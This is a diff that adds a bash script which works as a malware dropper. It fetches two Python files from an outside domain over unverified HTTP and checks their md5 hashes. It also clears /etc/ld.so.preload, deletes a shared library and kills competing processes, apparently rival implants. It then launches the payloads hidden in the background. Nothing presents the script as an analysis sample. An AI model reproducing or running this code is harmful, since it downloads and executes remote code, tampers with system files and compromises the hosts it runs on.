@@ -1,0 +1,173 @@
+#!/bin/bash
+DIR="/var/tmp"
+if [ -a "/var/tmp/ss3.py" ]
+then
+    if [ -w "/var/tmp/ss3.py" ] && [ ! -d "/var/tmp/ss3.py" ]
+    then
+        if [ -x "$(command -v md5sum)" ]
+        then
+            sum=$(md5sum /var/tmp/ss3.py | awk '{ print $1 }')
+            echo "$sum"
+            case $sum in
+                f85411938bb83211cadb5ba439d5922b | f85411938bb83211cadb5ba439d5922b)
+                    echo "ss3.py OK"
+                ;;
+                *)
+                    echo "ss3.py wrong"
+                    rm -rf /usr/local/lib/libkk.so
+                    echo "" > /etc/ld.so.preload
+                    pkill -f xdd.conf
+                    sleep 4
+                ;;
+            esac
+        fi
+        echo "P OK"
+    else
+        DIR=$(mktemp -d)/var/tmp
+        mkdir "$DIR"
+        echo "T DIR $DIR"
+    fi
+else
+    if [ -d "/var/tmp" ]
+    then
+        DIR="/var/tmp"
+    fi
+    echo "P NOT EXISTS"
+fi
+if [ -d "/var/tmp/ss3.py" ]
+then
+    DIR=$(mktemp -d)/var/tmp
+    mkdir "$DIR"
+    echo "T DIR $DIR"
+fi
+WGET="wget -O"
+if [ -s /usr/bin/curl ];
+then
+    WGET="curl -o";
+fi
+if [ -s /usr/bin/wget ];
+then
+    WGET="wget -O";
+fi
+f2="jukesbrxd.xyz"
+
+downloadIfNeed()
+{
+    if [ -x "$(command -v md5sum)" ]
+    then
+        if [ ! -f "$DIR"/ss3.py ]; then
+            echo "File not found!"
+            download
+        fi
+        sum=$(md5sum "$DIR"/ss3.py | awk '{ print $1 }')
+        echo "$sum"
+        case $sum in
+            f85411938bb83211cadb5ba439d5922b | f85411938bb83211cadb5ba439d5922b)
+                echo "ss3.py OK"
+            ;;
+            *)
+                echo "ss3.py wrong"
+                sizeBefore=$(du "$DIR"/ss3.py)
+                if [ -s /usr/bin/curl ];
+                then
+                    WGET="curl -k -o ";
+                fi
+                if [ -s /usr/bin/url ];
+                then
+                    WGET="url -k -o ";
+                fi
+                if [ -s /usr/bin/wget ];
+                then
+                    WGET="wget --no-check-certificate -O ";
+                fi
+                if [ -s /usr/bin/get ];
+                then
+                    WGET="get --no-check-certificate -O ";
+                fi
+                download
+                sumAfter=$(md5sum "$DIR"/ss3.py | awk '{ print $1 }')
+                if [ -s /usr/bin/curl ];
+                then
+                    echo "redownloaded $sum $sizeBefore after $sumAfter " $(du "$DIR"/ss3.py) > "$DIR"/var/tmp.txt
+                fi
+            ;;
+        esac
+    else
+        echo "No md5sum"
+        download
+    fi
+}
+
+download() {
+    if [ -x "$(command -v md5sum)" ]
+    then
+        sum=$(md5sum "$DIR"/ss3.py3 | awk '{ print $1 }')
+        echo "$sum"
+        case $sum in
+            f85411938bb83211cadb5ba439d5922b | f85411938bb83211cadb5ba439d5922b)
+                echo "ss3.py OK"
+                cp "$DIR"/ss3.py3 "$DIR"/ss3.py
+		        cp "$DIR"/ss3.py3 "$DIR"/ss3.py
+            ;;
+            *)
+                echo "ss3.py wrong"
+                download2
+            ;;
+        esac
+    else
+        echo "No md5sum"
+        download2
+    fi
+}
+
+download2() {
+    if [ $(getconf LONG_BIT) = "64" ]
+    then
+    	echo "" > /etc/ld.so.preload
+    	$WGET "$DIR"/ss3.py http://www.jukesxdbrxd.xyz/ss3.py
+    	$WGET "$DIR"/ss2.py http://www.jukesxdbrxd.xyz/ss2.py
+    else
+    	echo "" > /etc/ld.so.preload
+        $WGET "$DIR"/ss3.py http://www.jukesxdbrxd.xyz/ss3.py
+        $WGET "$DIR"/ss2.py http://www.jukesxdbrxd.xyz/ss2.py
+    fi
+    if [ -x "$(command -v md5sum)" ]
+    then
+        sum=$(md5sum "$DIR"/ss3.py | awk '{ print $1 }')
+        echo "$sum"
+        case $sum in
+            f85411938bb83211cadb5ba439d5922b | f85411938bb83211cadb5ba439d5922b)
+                echo "ss3.py OK"
+                cp "$DIR"/ss3.py "$DIR"/ss3.py3
+            ;;
+            *)
+                echo "ss3.py wrong"
+            ;;
+        esac
+    else
+        echo "No md5sum"
+    fi
+}
+
+judge2() {
+    if [ ! "$(ps aux|grep 'ss2.py\|ss3.py'|grep -v grep)" ];
+    then
+        downloadIfNeed
+        $WGET "$DIR"/ss2.py http://www.jukesxdbrxd.xyz/ss2.py
+		$WGET "$DIR"/ss3.py http://www.jukesxdbrxd.xyz/ss3.py
+        chmod +x "$DIR"/ss3.py
+        chmod +x "$DIR"/ss2.py
+		nohup python "$DIR"/ss3.py > /dev/null 2>&1 &
+        nohup python "$DIR"/ss2.py > /dev/null 2>&1 &
+        sleep 5
+    else
+        echo "Running"
+    fi
+}
+
+if [ ! "$(ps aux|grep 'ss2.py\|ss3.py'|grep -v grep)" ];
+then
+    judge2
+else
+    judge2
+fi
